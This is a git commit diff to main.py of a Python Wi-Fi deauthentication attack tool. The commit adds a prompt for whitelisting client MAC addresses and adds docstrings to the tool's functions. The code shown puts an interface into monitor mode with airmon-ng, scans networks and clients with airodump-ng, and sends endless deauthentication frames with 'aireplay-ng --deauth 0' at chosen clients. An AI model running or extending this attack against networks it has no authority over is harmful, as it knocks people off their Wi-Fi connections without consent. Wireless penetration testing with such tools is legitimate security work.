232ce475f00d740c1856c571b49641b147f9cbd3
Kostas Bouzianis <kostasbouzianis@gmail.com>
2025-04-09 11:35:35 +0100

    filter_clients_from_deauth

--- main.py
+++ main.py
@@ -30,11 +30,13 @@ logo = teal + r"""
 
 
 def check_sudo():
+    """Verify sudo privileges."""
     if not "SUDO_UID" in os.environ.keys():
         print(f"{red}[!] Please run the tool with sudo privileges.{reset}")
         exit()
 
 def backup_csv():
+    """Backup old CSV files from previous runs."""
     for file_name in os.listdir():
         if ".csv" in file_name:
             print(f"{yellow}[!]{reset} Moving old .csv files in the backup folder.")
@@ -60,7 +62,7 @@ def get_wifi_int():
             try:
                 choice = int(input(f"\n{yellow}[>]{reset} Please select the interface you want to use for the attack: ").strip())
                 if 0 <= choice <= len(net_int) - 1:
-                    print(f"{green}[+] {net_int[choice]} connected.{reset}\n")
+                    print(f"{green}[+] {net_int[choice]} connected.{reset}")
                     break
                 else:
                     print(f"{red}[!]{reset} Please enter a number that corresponds with the choises available.")
@@ -69,6 +71,7 @@ def get_wifi_int():
         return net_int[choice - 1]
         
 def set_monitor_mode(inf):
+    """Switch interface in monitor mode."""
     try:
         print(f"{yellow}[*]{reset} Switching to 'monitor' mode...")
         subprocess.run(["airmon-ng", "check", "kill"], check=True)
@@ -96,7 +99,7 @@ def scan_networks(inf):
     """Run airodump-ng to discover networks."""
     try:
         wifi_bands = ["bg (2.4Ghz)", "a (5Ghz)", "abg (all bands, will be slower)"]
-        print(f"{yellow}[?]{reset} Please select the frequency you want to scan {cyan}(verify that your adapter supports 5GHz if chosen){reset}:")
+        print(f"\n{yellow}[?]{reset} Please select the frequency you want to scan {cyan}(verify that your adapter supports 5GHz if chosen){reset}:")
         for idx, band in enumerate(wifi_bands):
             print(f"{purple}[{idx}]{reset} {cyan}{band}{reset}")
         while True:
@@ -119,16 +122,40 @@ def select_target(networks):
     pass
 
 def get_clients(wifi_ssid, wifi_channel, wifi_name):
+    """Capture clients on target network."""
     subprocess.Popen(["airodump-ng", "--bssid", wifi_ssid, "--channel", wifi_channel, "-w", "clients", "--write-interval", "1", "--output-format", "csv", wifi_name],  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-def filter_clients(clients, whitelist):
+def filter_clients():
     """Exclude whitelisted MACs from attack."""
-    pass
+    mac_address_regex = re.compile(r'(?:[0-9a-fA-F]:?){12}')
+    excluded_macs = []
+    while True:
+        try:
+            print(f"\n{yellow}[-]{reset} Enter MACs to exclude (comma-separated) or leave empty to attack all.")
+            macs = input(f"{yellow}[>]{reset} Your choices {cyan}ie 00:11:22:33:44:55,11:22:33:44:55:66{reset} :\n")
+            if not macs:
+                print(f"{green}[!]{reset} You will attack all the clients.")
+                return []
+            macs_list = list(macs.split(","))
+            for mac in macs_list:
+                if not mac_address_regex.match(mac.strip()):
+                    raise ValueError("One or more MAC adresses have invalid format.")
+            excluded_macs = mac_address_regex.findall(macs)
+            if len(excluded_macs) > 0:
+                excluded_macs = [mac.upper() for mac in excluded_macs]
+                print(f"{yellow}[*]{reset} Excluded macs:")
+                for m in excluded_macs:
+                    print(f"    {purple}{m}{reset}")
+                return excluded_macs
+        except (Exception, ValueError) as e:
+            print(f"{red}[!] Error filtering clients: {e}{reset}")
 
 def deauth_attack(network_mac, target_mac, interface):
+    """Deauth attack on selected clients."""
     subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", network_mac, "-c", target_mac, interface])
 
 def restore_managed_mode(inf):
+    """Revert interface to default managed mode."""
     try:
         print(f"{yellow}[*]{reset} Switching to default 'managed' mode...")
         subprocess.run(["ip", "link", "set", inf, "down"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
@@ -148,6 +175,7 @@ def main():
     print(logo)
     check_sudo()
     inter = get_wifi_int()
+    filter_clients()
     scan_networks(inter)
 
 if __name__ == "__main__":
